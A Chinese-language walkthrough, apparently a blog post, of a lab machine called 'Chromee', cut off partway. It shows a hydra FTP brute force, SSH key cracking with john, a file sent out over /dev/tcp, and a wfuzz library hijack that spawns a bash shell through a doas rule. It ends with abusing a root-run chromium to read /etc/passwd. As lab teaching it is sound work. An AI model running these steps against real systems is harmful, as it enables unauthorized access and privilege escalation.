Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward.</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+<p>这里给了一个文本，这个文本中还给了一个用户名<code>adriana</code> 然后把这个文本用cupp生成一个字典，给一个文本生成字典都用cupp<br>得到字典之后就用hydra爆破字典</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cupp -w tmp.txt                  </span><br><span class="line">/usr/bin/cupp:146: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;</span><br><span class="line">  print(&quot;      \                     # User&quot;)</span><br><span class="line">/usr/bin/cupp:147: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;</span><br><span class="line">  print(&quot;       \   \033[1;31m,__,\033[1;m             # Passwords&quot;)</span><br><span class="line">/usr/bin/cupp:148: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;</span><br><span class="line">  print(&quot;        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # Profiler&quot;)</span><br><span class="line">/usr/bin/cupp:149: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;</span><br><span class="line">  print(&quot;           \033[1;31m(__)    )\ \033[1;m  &quot;)</span><br><span class="line"> ___________ </span><br><span class="line">   cupp.py!                 # Common</span><br><span class="line">      \                     # User</span><br><span class="line">       \   ,__,             # Passwords</span><br><span class="line">        \  (oo)____         # Profiler</span><br><span class="line">           (__)    )\   </span><br><span class="line">              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]</span><br><span class="line">                            [ Mebus | https://github.com/Mebus/]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      *************************************************</span><br><span class="line">      *                    WARNING!!!                 *</span><br><span class="line">      *         Using large wordlists in some         *</span><br><span class="line">      *       options bellow is NOT recommended!      *</span><br><span class="line">      *************************************************</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Do you want to concatenate all words from wordlist? Y/[N]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Do you want to add special chars at the end of words? Y/[N]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Do you want to add some random numbers at the end of words? Y/[N]:</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Leet mode? (i.e. leet = 1337) Y/[N]:</span> </span><br><span class="line"></span><br><span class="line">[+] Now making a dictionary...</span><br><span class="line">[+] Sorting list and removing duplicates...</span><br><span class="line">[+] Saving dictionary to tmp.txt.cupp.txt, counting 663 words.</span><br><span class="line">[+] Now load your pistolero with tmp.txt.cupp.txt and shoot! Good luck!</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -l adriana -P tmp.txt.cupp.txt ftp://192.168.80.38:23333         </span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-29 15:44:53</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 663 login tries (l:1/p:663), ~42 tries per task</span><br><span class="line">[DATA] attacking ftp://192.168.80.38:23333/</span><br><span class="line">[23333][ftp] host: 192.168.80.38   login: adriana   password: Lily2020</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-29 15:44:58</span><br></pre></td></tr></table></figure></div>
+<p>登录上ftp之后，这里也有一个坑，有一个<code>...</code>文件,然后就拿到一个ssh私钥，去家目录可以看看有哪些用户</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lftp adriana@192.168.80.38:~&gt; ls /home</span><br><span class="line">drwxr-x---    4 1000     1000         4096 Mar 09 07:59 follower</span><br><span class="line">drwxr-x---    3 1001     1001         4096 Mar 07 12:39 softly</span><br></pre></td></tr></table></figure></div>
+<p>然后用john破解一下密码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh2john id_rsa &gt; hash</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# john hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure></div>
+<p>得到id_rsa密码 cassandra<br>登录到ssh</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh follower@192.168.80.38 -p 22 -i id_rsa</span><br><span class="line">Enter passphrase for key &#x27;id_rsa&#x27;: </span><br><span class="line">-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)</span><br><span class="line">follower@Chromee:~$ id</span><br><span class="line">uid=1000(follower) gid=1000(follower) groups=1000(follower)</span><br></pre></td></tr></table></figure></div>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="follower"><a href="#follower" class="headerlink" title="follower"></a>follower</h2><p>没有sudo  查了一下follower的文件，也没有什么特殊的，上传pspy64看看定时任务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">11</span>:<span class="number">38</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1</span>      <span class="operator">|</span> <span class="regexp">/sbin/</span><span class="keyword">init</span> </span><br><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">12</span>:<span class="number">01</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1621</span>   <span class="operator">|</span> <span class="regexp">/usr/</span>sbin<span class="operator">/</span><span class="type">CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">12</span>:<span class="number">01</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1622</span>   <span class="operator">|</span> <span class="regexp">/usr/</span>sbin<span class="operator">/</span><span class="type">CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">12</span>:<span class="number">01</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1623</span>   <span class="operator">|</span> <span class="regexp">/bin/</span>sh <span class="operator">-</span>c <span class="regexp">/root/</span>script.sh </span><br><span class="line"><span class="number">2025</span><span class="regexp">/03/</span><span class="number">29</span> <span class="number">09</span>:<span class="number">12</span>:<span class="number">01</span> <span class="type">CMD</span>: <span class="type">UID</span><span class="operator">=</span><span class="number">0</span>     <span class="type">PID</span><span class="operator">=</span><span class="number">1624</span>   <span class="operator">|</span> <span class="regexp">/bin/</span>bash <span class="regexp">/root/</span>script.sh </span><br><span class="line"><span class="operator">^</span><span class="type">CExiting</span> program<span class="operator">...</span> (interrupt)</span><br></pre></td></tr></table></figure></div>
+<p>发现会执行一个&#x2F;root&#x2F;script.sh<br>再看看这个目录下面有什么</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:~$ ls</span><br><span class="line">cat.gif  linpeas.sh  note.txt  pspy64</span><br><span class="line">follower@Chromee:~$ cat note.txt </span><br><span class="line">Think about rotations and the cat’s secrets.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">47 is not just a number, it&#x27;s a twist of fate.</span><br></pre></td></tr></table></figure></div>
+<p>有一个gif文件，然后提示是47 47 是rot47 把这个gif文件拿到本地来看一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"> ──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234  &gt; cat.gif</span><br><span class="line"></span><br><span class="line">follower@Chromee:~$ cat cat.gif &gt; /dev/tcp/192.168.80.11/1234</span><br><span class="line"></span><br><span class="line">exiftool cat.gif                                   AGAAAABB70bmFVK</span><br><span class="line">ExifTool Version Number         : 13.00</span><br><span class="line">File Name                       : cat.gif</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 3.5 MB</span><br><span class="line">File Modification Date/Time     : 2025:03:29 16:17:46+08:00</span><br><span class="line">File Access Date/Time           : 2025:03:29 16:17:34+08:00</span><br><span class="line">File Inode Change Date/Time     : 2025:03:29 16:17:46+08:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : GIF</span><br><span class="line">File Type Extension             : gif</span><br><span class="line">MIME Type                       : image/gif</span><br><span class="line">GIF Version                     : 89a</span><br><span class="line">Image Width                     : 640</span><br><span class="line">Image Height                    : 640</span><br><span class="line">Has Color Map                   : Yes</span><br><span class="line">Color Resolution Depth          : 8</span><br><span class="line">Bits Per Pixel                  : 8</span><br><span class="line">Background Color                : 0</span><br><span class="line">Animation Iterations            : Infinite</span><br><span class="line">Comment                         : Imagemagick Convert Timeline</span><br><span class="line">Profile CMM Type                : </span><br><span class="line">Profile Version                 : 4.3.0</span><br><span class="line">Profile Class                   : Display Device Profile</span><br><span class="line">Color Space Data                : RGB</span><br><span class="line">Profile Connection Space        : XYZ</span><br><span class="line">Profile Date Time               : 2016:01:01 00:00:00</span><br><span class="line">Profile File Signature          : acsp</span><br><span class="line">Primary Platform                : Unknown ()</span><br><span class="line">CMM Flags                       : Not Embedded, Independent</span><br><span class="line">Device Manufacturer             : </span><br><span class="line">Device Model                    : </span><br><span class="line">Device Attributes               : Reflective, Glossy, Positive, Color</span><br><span class="line">Rendering Intent                : Media-Relative Colorimetric</span><br><span class="line">Connection Space Illuminant     : 0.9642 1 0.82491</span><br><span class="line">Profile Creator                 : </span><br><span class="line">Profile ID                      : 0</span><br><span class="line">Profile Description             : sRGB</span><br><span class="line">Red Matrix Column               : 0.43607 0.22249 0.01392</span><br><span class="line">Green Matrix Column             : 0.38515 0.71687 0.09708</span><br><span class="line">Blue Matrix Column              : 0.14307 0.06061 0.7141</span><br><span class="line">Media White Point               : 0.9642 1 0.82491</span><br><span class="line">Red Tone Reproduction Curve     : (Binary data 40 bytes, use -b option to extract)</span><br><span class="line">Green Tone Reproduction Curve   : (Binary data 40 bytes, use -b option to extract)</span><br><span class="line">Blue Tone Reproduction Curve    : (Binary data 40 bytes, use -b option to extract)</span><br><span class="line">Profile Copyright               : Google Inc. 2016</span><br><span class="line">Frame Count                     : 13</span><br><span class="line">Duration                        : 6.31 s</span><br><span class="line">Image Size                      : 640x640</span><br><span class="line">Megapixels                      : 0.410</span><br></pre></td></tr></table></figure></div>
+<p>这里有一个<code>Imagemagick Convert Timeline</code>时间轴的提示，上网搜一下gif隐写，利用identify工具   得到一些数字</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# identify -format &quot;%T &quot; cat.gif  </span><br><span class="line">65 98 65 100 102 98 67 6 6 6 6 6 6</span><br></pre></td></tr></table></figure></div>
+<p>这里前面的数字都是ascii码的字母，所以就用这些可见字符的数字，然后用cyberchef rot47 要先用decimal转成字符<br><img src="https://pic1.imgdb.cn/item/67e7ae070ba3d5a1d7e62008.png"><br>得到了一个密码<code>p3p573r</code> 这个密码不是另一个用户的密码，这是follower的密码<br>然后在这里也很容易卡住，拿到密码之后不知道怎么用，因为也没有sudo</p>
+<p>找一下root的文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/home$ find / -user root -print 2&gt;/dev/null | grep -Pi -v &quot;sys|sys|proc|run|usr|boot|dev|etc|var&quot;</span><br><span class="line">/</span><br><span class="line">/mnt</span><br><span class="line">/bin</span><br><span class="line">/root</span><br><span class="line">/home</span><br><span class="line">/home/follower/cat.gif</span><br><span class="line">/lib32</span><br><span class="line">/sbin</span><br><span class="line">/vmlinuz.old</span><br><span class="line">/lost+found</span><br><span class="line">/libx32</span><br><span class="line">/lib</span><br><span class="line">/initrd.img.old</span><br><span class="line">/vmlinuz</span><br><span class="line">/tmp</span><br><span class="line">/tmp/.Test-unix</span><br><span class="line">/tmp/.XIM-unix</span><br><span class="line">/tmp/.ICE-unix</span><br><span class="line">/tmp/.font-unix</span><br><span class="line">/tmp/.X11-unix</span><br><span class="line">/srv</span><br><span class="line">/srv/zeus.conf</span><br><span class="line">/srv/ftp</span><br><span class="line">/initrd.img</span><br><span class="line">/opt</span><br><span class="line">/opt/note/...</span><br><span class="line">/opt/note/dic.txt</span><br><span class="line">/opt/...</span><br><span class="line">/media</span><br><span class="line">/media/cdrom</span><br><span class="line">/media/cdrom0</span><br><span class="line">/lib64</span><br></pre></td></tr></table></figure></div>
+<p>这里可以发现一个srv目录下的配置文件zeus.conf </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/srv$ cat zeus.conf </span><br><span class="line">permit follower as softly cmd /usr/local/bin/wfuzz</span><br><span class="line">permit nopass :softly as root cmd /usr/bin/chromium</span><br><span class="line">permit nopass :softly as root cmd /usr/bin/kill </span><br></pre></td></tr></table></figure></div>
+<p>之前没有见过这种东西，问了gpt知道这是doas的规则 现在follower可以用softly执行  &#x2F;usr&#x2F;local&#x2F;bin&#x2F;wfuzz<br>那现在的目标就是先切换到softly<br>看一下wfuzz中内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/srv$ cat /usr/local/bin/wfuzz</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/python3</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">from wfuzz.wfuzz import main</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    sys.argv[0] = re.sub(r&#x27;(-script\.pyw|\.exe)?$&#x27;, &#x27;&#x27;, sys.argv[0])</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure></div>
+<p>发现这里导入了库wfuzz.wfuzz</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/srv$ find / -name &#x27;wfuzz&#x27; -print 2&gt;/dev/null  </span><br><span class="line">/usr/local/bin/wfuzz</span><br><span class="line">/usr/local/lib/python3.9/dist-packages/wfuzz</span><br><span class="line">follower@Chromee:/srv$ cd /usr/local/lib/python3.9/dist-packages/wfuzz</span><br><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ ls</span><br><span class="line">__init__.py  __pycache__   api.py   dictionaries.py  externals  factories  fuzzobjects.py  fuzzrequest.py  mixins.py  myqueues.py  plugin_api  ui</span><br><span class="line">__main__.py  advanced.rst  core.py  exception.py     facade.py  filters    fuzzqueues.py   helpers         myhttp.py  options.py   plugins     wfuzz.py</span><br></pre></td></tr></table></figure></div>
+<p>找到文件之后，尝试劫持库 先找到一个可以写入的文件 然后写bash</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find . -writable -print 2&gt;/dev/null</span><br><span class="line">./plugins/payloads/file.py</span><br><span class="line"></span><br><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ echo &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot; &gt; ./plugins/payloads/file.py</span><br></pre></td></tr></table></figure></div>
+<p>再用softly执行wfuzz就能拿到softly的shell了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ doas -u softly /usr/local/bin/wfuzz -w /home/note.txt -u 127.0.0.1</span><br><span class="line">Password: </span><br><span class="line"> /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ doas -u softly /usr/local/bin/wfuzz -w /home/note.txt -u 127.0.0.1</span><br><span class="line">Password: </span><br><span class="line"> /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br></pre></td></tr></table></figure></div>
+<h2 id="softly"><a href="#softly" class="headerlink" title="softly"></a>softly</h2><p>下一步就是要用&#x2F;usr&#x2F;bin&#x2F;chromium提权了，这个是个谷歌浏览器<br>现在要用一些危险的参数，首先就是禁用沙箱 然后禁用gpu加速渲染 不发送请求头<br>发现这些参数的过程可以先什么参数都不用，然后先提示root执行就要禁用沙箱，然后把报错信息给ai一步步改<br>核心目标就是读取文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">softly@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ doas -u root /usr/bin/chromium  --no-sandbox --headless  --disable-gpu  -dump-dom file:///etc/passwd</span><br><span class="line">[0329/095206.275413:WARNING:bluez_dbus_manager.cc(248)] Floss manager not present, cannot set Floss enable/disable.</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;meta name=&quot;color-scheme&quot; content=&quot;light dark&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;pre style=&quot;word-wrap: break-word; white-space: pre-wrap;&quot;&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:109::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">follower:x:1000:1000::/home/follower:/bin/bash</span><br><span class="line">softly:x:1001:1001::/home/softly:/bin/bash</span><br><span class="line">ftp:x:106:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+<p>这样就可以读取任意文件就解决了。   看来我确实是做不出来 这些参数少一个或者用错都不行 最后的–dump-dom是打印出内容</p>
+<p>下面还有一个预期方案，就是开一个调试窗口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">softly@Chromee:/home/follower$ doas -u root /usr/bin/chromium --no-sandbox --headless --remote-debugging-port=9222 http://127.0.0.1 &amp;</span><br><span class="line">[2] 18087</span><br><span class="line"></span><br><span class="line">ss -lntup</span><br><span class="line">Netid          State           Recv-Q          Send-Q                   Local Address:Port                    Peer Address:Port         Process          </span><br><span class="line">udp            UNCONN          0               0                              0.0.0.0:68                           0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               10                           127.0.0.1:8000                         0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               10                           127.0.0.1:9222                         0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               511                            0.0.0.0:80                           0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               128                            0.0.0.0:22                           0.0.0.0:*                             </span><br><span class="line">tcp            LISTEN          0               32                                   *:23333                              *:*                             </span><br><span class="line">tcp            LISTEN          0               511                               [::]:80                              [::]:*                             